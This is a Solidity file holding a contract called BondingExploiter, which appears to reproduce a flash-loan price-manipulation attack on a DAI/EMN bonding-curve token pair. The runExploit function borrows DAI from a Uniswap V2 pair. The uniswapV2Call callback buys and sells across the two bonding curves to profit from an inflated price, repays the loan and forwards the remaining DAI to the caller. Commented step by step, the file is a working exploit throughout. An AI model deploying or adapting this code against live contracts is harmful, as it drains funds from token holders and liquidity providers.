// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IUniswapV2Pair {
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
    function token1() external returns (address);
}

interface ICurrency {
    function buy(uint _amount, uint _min) external returns (uint _bought);
    function sell(uint _amount, uint _min) external returns (uint _bought);
    function approve(address spender, uint amount) external returns (bool);
}

/// @dev Exploiter contract
contract BondingExploiter {

    IUniswapV2Pair pair;
    ICurrency currencyBase;
    ICurrency currencyToken;

    /// @dev Runs exploit, flashloan borrows `amount` of Uniswap liq
    function runExploit(
        address _uniswapPair, // DAI-USDC pair
        address _currencyBase, // DAI <-> EMN
        address _currencyToken, // EMN <-> TOKEN
        uint256 amount
    ) external {
        pair = IUniswapV2Pair(_uniswapPair);
        currencyBase = ICurrency(_currencyBase);
        currencyToken = ICurrency(_currencyToken);

        pair.swap(0,amount,address(this),bytes("not empty"));
    }

    /// @dev Flashloan callback, extracts DAI
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, 
        uint256 _amount1, // dai
        bytes calldata _data
    ) external {
        require(msg.sender == address(pair),'callback');

        IERC20 dai = IERC20(pair.token1());
        dai.approve(address(currencyBase),type(uint256).max);
        currencyBase.approve(address(currencyToken),type(uint256).max);

        uint256 baseAmount = currencyBase.buy(_amount1,0); // buy up EMN using all DAI, increases supply of both
        uint256 tokenAmount = currencyToken.buy(baseAmount/2,0); // convert half of EMN -> TOKEN, burns EMN supply

        currencyBase.sell(baseAmount/2,0); // sell EMN which has an inflated price
        baseAmount = currencyToken.sell(tokenAmount,0); // swap TOKEN -> EMN, at no loss of EMN
        currencyBase.sell(baseAmount,0); // sell remaining EMN tokens

        uint256 loanPlusInterest = (_amount1*(10**18)*1000/997/(10**18))+1; // exact amount owed
        dai.transfer(msg.sender,loanPlusInterest); // pay back flashloan
        dai.transfer(tx.origin,dai.balanceOf(address(this))); // lazy
    }   

}